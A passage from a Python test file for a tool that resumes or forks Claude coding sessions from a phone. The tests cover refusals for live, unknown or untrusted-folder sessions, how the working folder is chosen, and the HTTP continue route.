    assert len([s for s in mac.scripts if s[0] == work_sessions.TERMINAL_OPEN]) == 1
    assert path.read_text() == before and OTHER in state.sessions   # the original is left as it was
    reloaded = WorkSessions(root=tmp_path / "personal" / "work", home=tmp_path / "home", osascript=_never, environ={})
    assert reloaded.records[new].cwd == str(cwd) and reloaded.records[new].resumed_from == OTHER


def test_continue_is_refused_when_it_cannot_or_need_not_fork(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    state = State()
    work, mac = make(tmp_path, state=state, clock=lambda: now["t"])
    assert asyncio.run(work.continue_session(OTHER, "go"))[0] == 404             # unknown
    state.session_start(OTHER, cwd=str(tmp_path / "gone"))                      # no folder, no transcript
    assert asyncio.run(work.continue_session(OTHER, "go")) == (409, {"ok": False, "reason": work_sessions.NO_CONTINUE})
    state.session_end(OTHER)
    adopted(tmp_path, state)
    for bad in ("", "  ", None, 3, "x" * 4001):
        assert asyncio.run(work.continue_session(OTHER, bad))[0] == 400
    assert asyncio.run(work.continue_session(OTHER, "go", "c" * 65))[0] == 400
    live = start(work, "hello")[1]["session"]["id"]                             # a live Work session takes replies
    mac.claude(5, live)
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.continue_session(live, "go")) == (409, {"ok": False, "reason": work_sessions.LIVE_WORK})
    mac.ps_fails = True                                                         # cannot tell: never fork
    assert asyncio.run(work.continue_session(live, "go"))[0] == 409
    assert len(mac.scripts) == 1                                                # only the start opened a window
    mac.ps_fails = False
    assert asyncio.run(work.continue_session(OTHER, "go"))[0] == 200            # positive control


def test_an_ended_work_session_can_be_continued_in_the_work_folder(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    root = tmp_path / "personal" / "work"
    transcript(work_sessions.derived_transcript(root, sid, tmp_path / "claude"),
               [line("user", "hello"), line("assistant", [{"type": "text", "text": "Done."}])])
    now["t"] += work_sessions.GRACE_SECS + 1                                    # claude exited
    out = asyncio.run(work.detail(sid))[1]
    assert out["ended"] is True and out["session"]["can_continue"] is True
    status, got = asyncio.run(work.continue_session(sid, "one more thing"))
    assert status == 200 and got["session"]["title"] == "hello" and got["session"]["folder"] == "work"
    assert mac.scripts[-1][1][0].startswith(f"cd {shlex.quote(str(root))} && ")
    assert (tmp_path / "home" / "work" / f"{got['session']['id']}.resume").read_text() == sid


def test_the_continue_route(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    adopted(tmp_path, state)

    async def go() -> None:
        server, port, token = await serve(tmp_path, FakeInlet(store_at(tmp_path)), work=lambda: work)
        path = f"{link_chat.SESSIONS_PATH}/{OTHER}/continue"
        assert (await http(port, "GET", path, token=token))[0] == 405
        assert (await http(port, "POST", path, {"text": ""}, token=token))[0] == 400
        status, _, raw = await http(port, "POST", path, {"text": "keep going", "client_id": "k"}, token=token)
        got = json.loads(raw)
        assert status == 200 and got["session"]["from_work"] is True and got["session"]["id"] != OTHER
        await server.close()

    asyncio.run(go())


def test_a_session_whose_shell_moved_continues_in_the_folder_it_started_in(tmp_path: Path) -> None:
    """A hook's cwd is the shell's folder now (after ``cd rust``); the transcript's first cwd is the project."""
    state = State()
    work, mac = make(tmp_path, state=state)
    project = tmp_path / "code" / "eve"
    sub = project / "rust"
    sub.mkdir(parents=True)
    state.session_start(OTHER, cwd=str(sub))
    path = transcript(tmp_path / "claude" / "projects" / "-code-eve" / f"{OTHER}.jsonl", [
        {"type": "user", "cwd": str(project), "timestamp": "2026-10-20T10:00:00Z",
         "message": {"role": "user", "content": "Make the hooks fast"}},
        {"type": "assistant", "cwd": str(sub), "timestamp": "2026-10-20T10:01:00Z",
         "message": {"role": "assistant", "content": [{"type": "text", "text": "Done."}]}}])
    assert work_sessions.transcript_cwd(path) == str(project)
    assert asyncio.run(work.detail(OTHER))[1]["session"]["folder"] == "eve"
    assert next(r for r in asyncio.run(work.list())[1]["sessions"] if r["id"] == OTHER)["folder"] == "eve"
    out = asyncio.run(work.continue_session(OTHER, "go on"))[1]
    assert out["session"]["folder"] == "eve"
    assert mac.scripts[-1][1][0].startswith(f"cd {shlex.quote(str(project))} && ")
    # a start folder that is gone: the shell's folder, which is there
    path.write_text(path.read_text().replace(str(project), str(tmp_path / "deleted"), 1))
    asyncio.run(work.continue_session(OTHER, "again"))
    assert mac.scripts[-1][1][0].startswith(f"cd {shlex.quote(str(sub))} && ")
    assert work_sessions.transcript_cwd(None) == "" and work_sessions.transcript_cwd(tmp_path / "none") == ""


def test_continue_refuses_a_folder_claude_was_never_trusted_in(tmp_path: Path) -> None:
    """An interactive claude in an untrusted folder stops at the trust prompt before its first prompt, and the
    phone cannot press it: refuse with the reason instead of opening a window that waits (found live 2026-10-20)."""
    state = State()
    work, mac = make(tmp_path, state=state)
    adopted(tmp_path, state)
    claude_state = tmp_path / "claude" / ".claude.json"
    claude_state.write_text(json.dumps({"projects": {str(tmp_path / "code"): {"hasTrustDialogAccepted": False}}}))
    assert asyncio.run(work.continue_session(OTHER, "go")) == (409, {"ok": False, "reason": work_sessions.UNTRUSTED})
    assert mac.scripts == []
    assert work_sessions.folder_trusted(str(tmp_path / "code" / "eve"), tmp_path / "claude") is False
    claude_state.write_text("not json")                                   # unreadable: never blocks
    assert work_sessions.folder_trusted(str(tmp_path / "code" / "eve"), tmp_path / "claude") is None
    claude_state.write_text(json.dumps({"projects": {str(tmp_path): {"hasTrustDialogAccepted": True}}}))
    assert asyncio.run(work.continue_session(OTHER, "go"))[0] == 200     # a trusted folder above it: positive control
